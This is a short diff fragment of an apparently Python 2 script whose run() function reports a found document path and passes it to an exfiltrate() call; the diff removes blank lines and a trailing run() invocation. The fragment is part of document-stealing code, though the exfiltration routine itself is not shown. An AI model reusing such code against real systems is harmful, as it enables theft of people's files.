@@ -74,7 +74,4 @@ def run(**args):
 	      print "Found: %s" % document_path
               exfiltrate(document_path)
 	      return True
-              
-              
 
-run()
